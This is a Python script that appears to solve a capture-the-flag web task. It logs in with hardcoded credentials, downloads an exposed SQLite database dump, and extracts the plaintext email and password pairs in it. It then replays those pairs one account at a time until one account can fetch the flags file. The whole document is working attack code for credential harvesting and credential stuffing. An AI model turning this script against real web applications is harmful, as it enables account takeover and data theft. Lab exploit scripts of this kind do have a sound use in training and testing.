import sqlite3
import sys
import tempfile
from typing import Optional
from urllib.parse import urljoin, urlsplit

import requests
from bs4 import BeautifulSoup, NavigableString

DUMP_USER_EMAIL = "avgle4kenj0yer.kRGAkbfctDFlIA@proton.me"
DUMP_USER_PASSWORD = "ysR6Z1TnBsFS5QqoXMV4ZQ"

POST_DB_DUMP = 3
POST_FLAGS = 5


# extract_csrf_token returns the CSRF token contained in the CSRF input tag, or None
def extract_csrf_token(content: bytes) -> Optional[str]:
    soup = BeautifulSoup(content, "html.parser")
    tag = soup.find("input", {"id": "csrf_token"})

    if tag is None:
        return None
    elif isinstance(tag, NavigableString):
        raise ValueError("Non-tag CSRF input found")

    value = tag.get("value")
    if isinstance(value, list):
        raise ValueError("CSRF tag contains multiple values")

    return value


# login logs the session into the application
def login(s: requests.Session, baseURL: str, email: str, password: str):
    r = s.get(urljoin(baseURL, "/signin"))
    r.raise_for_status()

    csrf_token = extract_csrf_token(r.content)
    assert csrf_token is not None, "CSRF token not found on login page"

    r = s.post(
        urljoin(baseURL, "/signin"),
        data={"email": email, "password": password, "csrf_token": csrf_token},
    )
    r.raise_for_status()

    assert urlsplit(r.url).path == "/", f"Failed to login using {email}:{password}"

    print(f"Logged in as {email}:{password}")


# download_file tries downloading the file linked to the specified post,
# and returns the file's bytes if the download succeeded
def download_file(s: requests.Session, baseURL: str, post: int) -> Optional[bytes]:
    r = s.get(urljoin(baseURL, f"/files/{post}"))
    r.raise_for_status()

    if urlsplit(r.url).path != f"/files/{post}":
        return None

    return r.content


def main():
    if len(sys.argv) < 2:
        print("Specify base URL of the task as argument.", file=sys.stderr)
        sys.exit(1)

    baseURL = sys.argv[1]
    s = requests.session()

    # login as dump user and download the DB dump
    login(s, baseURL, DUMP_USER_EMAIL, DUMP_USER_PASSWORD)
    db_dump = download_file(s, baseURL, POST_DB_DUMP)

    assert db_dump is not None, "Failed to download DB dump using provided user"

    with tempfile.NamedTemporaryFile() as tf:
        tf.write(db_dump)
        print(f"Downloaded SQLite DB dump of size {len(db_dump)} to {tf.name}")

        conn = sqlite3.connect(tf.name)
        res = conn.execute("select email, password from user")
        users = res.fetchall()
        conn.close()

    print(f"DB dump contains {len(users)} users")

    # manually iterate with retries because the proxy is so unstable
    i = 0
    while i < len(users):
        email, password = users[i]

        try:
            s = requests.session()
            login(s, baseURL, email, password)
            flags = download_file(s, baseURL, POST_FLAGS)
        except:
            continue

        i += 1

        if flags is not None:
            print("Successfully downloaded flags")
            print(flags.decode())
            break


if __name__ == "__main__":
    main()
